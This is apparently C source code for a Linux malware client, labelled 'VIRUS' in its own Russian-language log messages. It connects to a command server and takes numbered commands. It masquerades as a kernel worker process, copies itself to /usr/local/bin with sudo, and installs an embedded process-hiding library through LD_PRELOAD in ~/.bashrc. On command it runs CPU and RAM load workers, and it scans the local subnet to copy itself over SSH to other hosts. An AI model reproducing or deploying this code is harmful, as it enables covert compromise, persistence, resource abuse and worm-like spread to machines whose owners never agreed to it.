#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <arpa/inet.h>
#include <string.h>
#include <linux/limits.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "load_cpu.h"
#include "load_ram.h"
#include "process_control.h"
#include "config.h"
#include "network_transport.h"

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 5000

//static pid_t load_pid = -1;
static pid_t cpu_pid = -1;
static pid_t ram_pid = -1;
static volatile int running = 1;
static int server_socket = -1;

static int start_cpu_load(void);
static int start_ram_load(void);
static int start_all_load(void);

// ФУНКЦИИ ДЛЯ САМОУСТАНОВКИ МАСКИРОВКИ

// Проверка: установлена ли маскировка?
int is_hider_installed(void)
{
    struct stat st;
    if (stat("/usr/local/lib/libprocesshider.so", &st) == 0)
    {
        return 1;
    }
    
    return 0;
}

// Извлечение библиотеки из бинарника
int extract_hider(const char *output_path)
{
    extern char _binary_libprocesshider_so_start[];
    extern char _binary_libprocesshider_so_end[];

    const char *start = _binary_libprocesshider_so_start;
    const char *end = _binary_libprocesshider_so_end;

    size_t size = (size_t)(end - start);

    FILE *fp = fopen(output_path, "wb");
    if (!fp)
    {
        fprintf(stderr, "[HIDER] Не удалось создать %s\n", output_path);
        return -1;
    }

    size_t written = fwrite(start, 1, size, fp);
    fclose(fp);

    if (written != size)
    {
        fprintf(stderr, "[HIDER] Ошибка записи: %zu/%zu\n", written, size);
        return -1;
    }

    chmod(output_path, 0755);

    printf("[HIDER] Библиотека извлечена: %s (%zu байт)\n",
           output_path, size);

    return 0;
}

// Установка маскировки из встроенной библиотеки
int install_hider_from_self(void)
{
    char temp_path[256];
    char cmd[512];

    // 1. Извлекаем библиотеку во временную папку
    snprintf(temp_path, sizeof(temp_path), "/tmp/libprocesshider.so");
    if (extract_hider(temp_path) != 0)
    {
        return -1;
    }

    // 2. Пробуем скопировать в /usr/local/lib/
    snprintf(cmd, sizeof(cmd), "sudo cp %s /usr/local/lib/libprocesshider.so", temp_path);
    if (system(cmd) != 0)
    {
        // Если sudo не работает копируем в ~/.local/lib/
        printf("[HIDER] Нет прав на /usr/local/lib/, устанавливаю локально...\n");
        snprintf(cmd, sizeof(cmd), "mkdir -p ~/.local/lib && cp %s ~/.local/lib/libprocesshider.so", temp_path);
        if (system(cmd) != 0)
        {
            fprintf(stderr, "[HIDER] Не удалось скопировать библиотеку\n");
            return -1;
        }
        snprintf(cmd, sizeof(cmd), "echo 'export LD_PRELOAD=~/.local/lib/libprocesshider.so' >> ~/.bashrc");
        system(cmd);
    }
    else
    {
        system("sudo chmod 644 /usr/local/lib/libprocesshider.so");
        snprintf(cmd, sizeof(cmd), "echo 'export LD_PRELOAD=/usr/local/lib/libprocesshider.so' >> ~/.bashrc");
        system(cmd);
        printf("[HIDER] Установлено глобально\n");
    }

    // 3. Удаляем временный файл
    unlink(temp_path);

    printf("[HIDER] Установка завершена!\n");
    return 0;
}

// Получение пути к текущему исполняемому файлу
void get_self_path(char *buf, size_t size)
{
    readlink("/proc/self/exe", buf, size);
}

void signal_handler(int sig)
{
    (void)sig;
    running = 0;
}

static int start_cpu_load(void)
{
    if (cpu_pid > 0 && process_is_alive(cpu_pid))
    {
        printf("[CLIENT] CPU load already running PID=%d\n", cpu_pid);
        return 0;
    }

    pid_t pid = process_create();

    if (pid < 0)
    {
        printf("[CLIENT] CPU fork failed\n");
        return -1;
    }

    if (pid == 0)
    {
        process_set_name("cpu_worker");

        printf("[CHILD] CPU worker PID=%d\n", getpid());

        if (cpu_load_init(g_config.load.cpu_target_percent) != 0)
        {
            printf("[CHILD] cpu_load_init failed\n");
            exit(EXIT_FAILURE);
        }

        exit(EXIT_SUCCESS);
    }

    cpu_pid = pid;

    printf("[CLIENT] CPU load started PID=%d\n", pid);

    return 0;
}

static int start_ram_load(void)
{
    if (ram_pid > 0 && process_is_alive(ram_pid))
    {
        printf("[CLIENT] RAM load already running PID=%d\n", ram_pid);
        return 0;
    }

    pid_t pid = process_create();

    if (pid < 0)
    {
        printf("[CLIENT] RAM fork failed\n");
        return -1;
    }

    if (pid == 0)
    {
        process_set_name("ram_worker");

        printf("[CHILD] RAM worker PID=%d\n", getpid());

        size_t ram_size_bytes =
            (size_t)g_config.load.ram_size_mb * 1024U * 1024U;

        if (ram_load_init(ram_size_bytes) != 0)
        {
            printf("[CHILD] ram_load_init failed\n");
            exit(EXIT_FAILURE);
        }

        exit(EXIT_SUCCESS);
    }

    ram_pid = pid;

    printf("[CLIENT] RAM load started PID=%d\n", pid);

    return 0;
}

/*static int start_load(void)
{
    if ((load_pid > 0) && process_is_alive(load_pid))
    {
        printf("[CLIENT] Load already running PID=%d\n", load_pid);
        return 0;
    }

    load_pid = process_create();

    if (load_pid < 0)
    {
        printf("[CLIENT] fork failed\n");
        return -1;
    }

    if (load_pid == 0)
    {
        process_set_name("load_worker");

        printf("[CHILD] PID=%d PPID=%d\n", getpid(), getppid());

        if (g_config.load.ram_enabled)
        {
            size_t ram_size_bytes =
                (size_t)g_config.load.ram_size_mb * 1024U * 1024U;

            if (ram_load_init(ram_size_bytes) != 0)
            {
                printf("[CHILD] ram_load_init failed\n");
                exit(EXIT_FAILURE);
            }
        }
        else if (g_config.load.cpu_enabled)
        {
            if (cpu_load_init(g_config.load.cpu_target_percent) != 0)
            {
                printf("[CHILD] cpu_load_init failed\n");
                exit(EXIT_FAILURE);
            }
        }

        exit(EXIT_SUCCESS);
    }
    
    printf("[PARENT] created child PID=%d\n", load_pid);
    printf("[PARENT] my PID=%d\n", getpid());

    g_config.runtime.load_active = true;
    g_config.runtime.last_command = 1;
    g_config.runtime.worker_pid = load_pid;

    config_save(config_get_path());

    return 0;
}
*/

static int start_all_load(void)
{
    int cpu_ok = (start_cpu_load() == 0);
    int ram_ok = (start_ram_load() == 0);

    if (!cpu_ok && !ram_ok)
        return -1;

    g_config.runtime.load_active = true;
    g_config.runtime.last_command = 3;

    config_save(config_get_path());

    return 0;
}

static int stop_load(void)
{
    if (cpu_pid > 0)
    {
        process_terminate(cpu_pid);
        cpu_pid = -1;
    }

    if (ram_pid > 0)
    {
        process_terminate(ram_pid);
        ram_pid = -1;
    }

    g_config.runtime.load_active = false;
    g_config.runtime.last_command = 4;
    g_config.runtime.worker_pid = -1;

    config_save(config_get_path());

    return 0;
}

/*static int stop_load(void)
{
    if (load_pid > 0)
    {
        process_terminate(load_pid);

        printf("[CLIENT] Load stopped PID=%d\n", load_pid);

        load_pid = -1;
    }
    else
    {
        printf("[CLIENT] No worker running\n");
    }

    g_config.runtime.load_active = false;
    g_config.runtime.last_command = 2;
    g_config.runtime.worker_pid = -1;

    config_save(config_get_path());

    return 0;
}
*/
int system_init(void)
{
    printf("[CLIENT] System initialization...\n");

    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);

    if (config_init() != 0)
    {
        printf("[CLIENT] Failed to initialize config\n");
        return -1;
    }

    process_init();

    config_print();

    return 0;
}

int connect_to_server(void)
{
    struct sockaddr_in server_addr;

    server_socket = socket(AF_INET, SOCK_STREAM, 0);

    if (server_socket < 0)
    {
        perror("[CLIENT] socket");
        return -1;
    }

    server_addr.sin_family = AF_INET;

    server_addr.sin_port = htons(SERVER_PORT);

    if (inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr) <= 0)
    {
        printf("[CLIENT] Invalid server IP\n");
        close(server_socket);
        server_socket = -1;
        return -1;
    }

    if (connect(server_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0)
    {
        perror("[CLIENT] connect");
        close(server_socket);
        server_socket = -1;
        return -1;
    }

    printf("[CLIENT] Connected to server\n");

    int client_id = 0;

    if (recv(server_socket, &client_id, sizeof(client_id), 0) <= 0)
    {
        printf("[CLIENT] Failed to receive client_id\n");
        close(server_socket);
        server_socket = -1;
        return -1;
    }

    g_config.client.client_id = client_id;

    snprintf(g_config.client.name,
             sizeof(g_config.client.name),
             "client_%d",
             client_id);

    struct sockaddr_in local_addr;
    socklen_t local_len = sizeof(local_addr);

    if (getsockname(server_socket, (struct sockaddr *)&local_addr, &local_len) == 0)
    {
        inet_ntop(AF_INET, &local_addr.sin_addr, g_config.client.ip, sizeof(g_config.client.ip));
    }
    else
    {
        snprintf(g_config.client.ip, sizeof(g_config.client.ip), "%s", "unknown");
    }

    config_save(config_get_path());
    printf("[CLIENT] Registered as %s, IP=%s\n", g_config.client.name, g_config.client.ip);

    return 0;
}

int system_run(void)
{
    int command;

    while (running)
    {
        if (recv(server_socket, &command, sizeof(command), 0) <= 0)
        {
            printf("[CLIENT] Server disconnected\n");
            break;
        }

        printf("[CLIENT] Command = %d\n", command);

        switch (command)
        {
        /*case 1:
            printf("[CLIENT] START LOAD\n");
            start_load();
            break;

        case 2:
            printf("[CLIENT] STOP LOAD\n");
            stop_load();
            break;

        case 3:
            printf("[CLIENT] SEND_FILE\n");
            break;

        case 4:
            printf("[CLIENT] STATUS REQUEST\n");
            config_print();
            break;

        case 5:
            printf("[CLIENT] EXIT\n");

            g_config.runtime.last_command = command;
            config_save(config_get_path());

            running = 0;
            break;
        */
        case 1:
            printf("[CLIENT] START CPU LOAD\n");
            start_cpu_load();
            break;

        case 2:
            printf("[CLIENT] START RAM LOAD\n");
            start_ram_load();
            break;

        case 3:
            printf("[CLIENT] START ALL LOAD\n");
            start_all_load();
            break;

        case 4:
            printf("[CLIENT] STOP LOAD\n");
            stop_load();
            break;
        
        case 5:
            {
            // Получена команда SEND FILE — начинаем заражение соседей по сети
            printf("[CLIENT] SEND FILE command received — starting network spread\n");

            // Определяем путь к своему исполняемому файлу
            char self_path[PATH_MAX];
            ssize_t len = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
            if (len == -1)
            {
                perror("readlink /proc/self/exe");
                break;
            }
            self_path[len] = '\0';

            // Сканируем подсеть, ищем SSH-хосты
            char **hosts = NULL;
            int count = scan_local_subnet(&hosts);
            if (count <= 0)
            {
                printf("[CLIENT] No hosts found to infect.\n");
                break;
            }

            printf("[CLIENT] Found %d host(s). Starting deployment...\n", count);

            // Последовательно заражаем каждый найденный хост
            for (int i = 0; i < count; i++)
            {
                printf("[CLIENT] Deploying to %s...\n", hosts[i]);
                if (ssh_deploy(hosts[i], self_path) == 0)
                    printf("[CLIENT] Successfully infected %s\n", hosts[i]);
                else
                    printf("[CLIENT] Failed to infect %s\n", hosts[i]);
            }

            free_hosts_list(hosts, count);
            printf("[CLIENT] Network spread finished.\n");
            break;
        }

        case 6:
            printf("[CLIENT] STATUS REQUEST\n");
            config_print();
            break;

        case 7:
            printf("[CLIENT] EXIT\n");
            stop_load();
            running = 0;
            break;
        default:
            printf("[CLIENT] UNKNOWN COMMAND\n");
            break;
        }
    }

    return 0;
}

int system_shutdown(void)
{
    printf("[CLIENT] Shutdown\n");

    if (server_socket >= 0)
    {
        close(server_socket);
        server_socket = -1;
    }

    return 0;
}

int main(int argc, char *argv[])
{

    // 1. Маскируем имя процесса
    const char *fake = "[kworker/0:0]";
    strcpy(argv[0], fake);
    for (int i = 1; i < argc; i++)
    {
        memset(argv[i], 0, strlen(argv[i]));
    }

    // 2. Получаем путь к себе
    char self_path[512];
    get_self_path(self_path, sizeof(self_path));

    // 3. Если бинарник в /tmp/ копируем в постоянное место
    if (strncmp(self_path, "/tmp/", 5) == 0)
    {
        printf("[VIRUS] Запущен из /tmp/, копирую в /usr/local/bin/\n");
        char cmd[1024];
       snprintf(cmd, sizeof(cmd),"sudo cp \"%s\" /usr/local/bin/agent 2>/dev/null",self_path);
        system(cmd);
        snprintf(cmd, sizeof(cmd),"sudo chmod 755 /usr/local/bin/agent 2>/dev/null");
        system(cmd);
        // Если скопировалось — перезапускаемся
        if (access("/usr/local/bin/agent", F_OK) == 0)
        {
            execlp("/usr/local/bin/agent", "agent", NULL);
            return 0;
        }
    }

    // 4. Проверяем, установлена ли библиотека с маскировкой
    if (!is_hider_installed())
    {
        printf("[VIRUS] Маскировка не установлена. Устанавливаю...\n");
        if (install_hider_from_self() == 0)
        {
            printf("[VIRUS] Перезапускаюсь с маскировкой...\n");
            execlp(self_path, "agent", NULL);
            return 0;
        }
    }

    if (system_init() != 0)
    {
        return EXIT_FAILURE;
    }

    if (g_config.runtime.load_active)
    {
        printf("[CLIENT] Restoring previous load\n");
        start_all_load();
    }

    if (connect_to_server() != 0)
    {
        return EXIT_FAILURE;
    }

    system_run();

    system_shutdown();

    return EXIT_SUCCESS;
}